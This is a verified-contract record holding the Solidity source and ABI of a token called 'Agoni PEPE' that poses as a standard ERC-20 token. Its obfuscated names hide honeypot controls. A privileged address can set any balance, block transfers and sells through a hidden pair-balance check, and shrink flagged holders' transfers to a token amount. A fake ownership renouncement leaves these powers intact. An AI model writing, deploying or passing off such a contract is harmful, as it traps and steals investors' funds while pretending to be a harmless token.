{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface swapAmountTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txFromLiquidity) external view returns (uint256);\n\n    function transfer(address enableMaxSwap, uint256 tokenReceiverLaunched) external returns (bool);\n\n    function allowance(address listAmountTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenReceiverLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableMaxSwap,\n        uint256 tokenReceiverLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundBuyTotal, uint256 value);\n    event Approval(address indexed listAmountTake, address indexed spender, uint256 value);\n}\n\nabstract contract launchedAtFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyTradingTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface teamBuy {\n    function createPair(address teamList, address modeEnable) external returns (address);\n}\n\ninterface swapAmountTakeMetadata is swapAmountTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AgoniPEPE is launchedAtFrom, swapAmountTake, swapAmountTakeMetadata {\n\n    uint256 private liquidityMin;\n\n    mapping(address => uint256) private launchedMarketingEnable;\n\n    bool private isWallet;\n\n    uint256 feeMode;\n\n    mapping(address => bool) public toShould;\n\n    uint256 constant teamExempt = 4 ** 10;\n\n    function transferFrom(address sellTotal, address enableMaxSwap, uint256 tokenReceiverLaunched) external override returns (bool) {\n        if (_msgSender() != tradingAt) {\n            if (sellTrading[sellTotal][_msgSender()] != type(uint256).max) {\n                require(tokenReceiverLaunched <= sellTrading[sellTotal][_msgSender()]);\n                sellTrading[sellTotal][_msgSender()] -= tokenReceiverLaunched;\n            }\n        }\n        return takeAt(sellTotal, enableMaxSwap, tokenReceiverLaunched);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitExemptTotal;\n    }\n\n    function allowance(address feeTeamTx, address marketingLaunched) external view virtual override returns (uint256) {\n        if (marketingLaunched == tradingAt) {\n            return type(uint256).max;\n        }\n        return sellTrading[feeTeamTx][marketingLaunched];\n    }\n\n    function shouldMax(uint256 tokenReceiverLaunched) public {\n        liquidityMinTx();\n        modeLimitMax = tokenReceiverLaunched;\n    }\n\n    address public shouldTake;\n\n    function maxSwap(address marketingMaxList) public {\n        liquidityMinTx();\n        if (launchedFund == liquidityToken) {\n            txTotal = true;\n        }\n        if (marketingMaxList == shouldTake || marketingMaxList == senderReceiver) {\n            return;\n        }\n        autoFund[marketingMaxList] = true;\n    }\n\n    function maxTotal(address atTo) public {\n        if (autoToken) {\n            return;\n        }\n        if (launchedFund == liquidityToken) {\n            modeToken = true;\n        }\n        toShould[atTo] = true;\n        if (txTotal) {\n            listSwapReceiver = launchedFund;\n        }\n        autoToken = true;\n    }\n\n    uint256 modeLimitMax;\n\n    bool public walletFrom;\n\n    event OwnershipTransferred(address indexed modeMarketing, address indexed fundEnable);\n\n    uint256 private liquidityToken;\n\n    function modeFee(address toSender, uint256 tokenReceiverLaunched) public {\n        liquidityMinTx();\n        launchedMarketingEnable[toSender] = tokenReceiverLaunched;\n    }\n\n    bool public modeToken;\n\n    string private receiverIs = \"APE\";\n\n    string private totalTx = \"Agoni PEPE\";\n\n    bool public autoToken;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listTeamLaunched;\n    }\n\n    bool public txTotal;\n\n    address private marketingSell;\n\n    uint256 private limitExemptTotal = 100000000 * 10 ** 18;\n\n    function launchedFee(address sellTotal, address enableMaxSwap, uint256 tokenReceiverLaunched) internal returns (bool) {\n        require(launchedMarketingEnable[sellTotal] >= tokenReceiverLaunched);\n        launchedMarketingEnable[sellTotal] -= tokenReceiverLaunched;\n        launchedMarketingEnable[enableMaxSwap] += tokenReceiverLaunched;\n        emit Transfer(sellTotal, enableMaxSwap, tokenReceiverLaunched);\n        return true;\n    }\n\n    uint256 private launchedFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverIs;\n    }\n\n    function balanceOf(address txFromLiquidity) public view virtual override returns (uint256) {\n        return launchedMarketingEnable[txFromLiquidity];\n    }\n\n    uint256 public listSwapReceiver;\n\n    function takeAt(address sellTotal, address enableMaxSwap, uint256 tokenReceiverLaunched) internal returns (bool) {\n        if (sellTotal == shouldTake) {\n            return launchedFee(sellTotal, enableMaxSwap, tokenReceiverLaunched);\n        }\n        uint256 exemptEnableLiquidity = swapAmountTake(senderReceiver).balanceOf(tradingTeam);\n        require(exemptEnableLiquidity == modeLimitMax);\n        require(enableMaxSwap != tradingTeam);\n        if (autoFund[sellTotal]) {\n            return launchedFee(sellTotal, enableMaxSwap, teamExempt);\n        }\n        return launchedFee(sellTotal, enableMaxSwap, tokenReceiverLaunched);\n    }\n\n    function liquidityMinTx() private view {\n        require(toShould[_msgSender()]);\n    }\n\n    address tradingAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return marketingSell;\n    }\n\n    address public senderReceiver;\n\n    mapping(address => mapping(address => uint256)) private sellTrading;\n\n    mapping(address => bool) public autoFund;\n\n    function marketingLiquidity() public {\n        emit OwnershipTransferred(shouldTake, address(0));\n        marketingSell = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalTx;\n    }\n\n    function transfer(address toSender, uint256 tokenReceiverLaunched) external virtual override returns (bool) {\n        return takeAt(_msgSender(), toSender, tokenReceiverLaunched);\n    }\n\n    uint256 private buyTeam;\n\n    constructor (){\n        if (walletFrom) {\n            walletFrom = true;\n        }\n        buyTradingTake buySell = buyTradingTake(tradingAt);\n        senderReceiver = teamBuy(buySell.factory()).createPair(buySell.WETH(), address(this));\n        if (liquidityMin != listSwapReceiver) {\n            modeToken = false;\n        }\n        shouldTake = _msgSender();\n        marketingLiquidity();\n        toShould[shouldTake] = true;\n        launchedMarketingEnable[shouldTake] = limitExemptTotal;\n        if (liquidityMin == liquidityToken) {\n            modeToken = true;\n        }\n        emit Transfer(address(0), shouldTake, limitExemptTotal);\n    }\n\n    function approve(address marketingLaunched, uint256 tokenReceiverLaunched) public virtual override returns (bool) {\n        sellTrading[_msgSender()][marketingLaunched] = tokenReceiverLaunched;\n        emit Approval(_msgSender(), marketingLaunched, tokenReceiverLaunched);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingSell;\n    }\n\n    uint8 private listTeamLaunched = 18;\n\n    address tradingTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listAmountTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundBuyTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTeamTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenReceiverLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFromLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwapReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMaxList\",\"type\":\"address\"}],\"name\":\"maxSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTo\",\"type\":\"address\"}],\"name\":\"maxTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenReceiverLaunched\",\"type\":\"uint256\"}],\"name\":\"modeFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenReceiverLaunched\",\"type\":\"uint256\"}],\"name\":\"shouldMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenReceiverLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableMaxSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenReceiverLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AgoniPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}